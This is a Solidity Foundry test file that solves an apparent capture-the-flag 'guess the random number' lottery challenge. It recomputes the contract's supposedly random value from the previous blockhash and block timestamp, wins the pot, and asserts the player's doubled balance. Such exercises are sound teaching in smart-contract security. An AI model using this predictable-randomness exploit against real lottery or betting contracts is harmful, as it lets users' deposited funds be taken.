// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import { GuessTheRandomNumberChallenge } from "../../src/lotteries/GuessRandomNum.sol";

contract GuessRandomNumTest is Test {
    GuessTheRandomNumberChallenge guessRandomNum;

    address deployer = vm.addr(7);
    address h3x0r = vm.addr(1337);

    function setUp() public {
        guessRandomNum = new GuessTheRandomNumberChallenge();
        deal(h3x0r, 1 ether);
        deal(deployer, 1 ether);
        vm.prank(deployer);
        guessRandomNum.guessTheRandomNumber{value: 1 ether}();
    }

    function testRandomNumExploit() public {
        vm.startPrank(h3x0r);
        // is this allowed? this seemed too easy
        uint8 key = uint8(uint(keccak256(
            abi.encodePacked(blockhash(block.number - 1), block.timestamp)
        )));
        guessRandomNum.guess{value: 1 ether}(key);
        assertEq(h3x0r.balance, 2 ether);
    }
}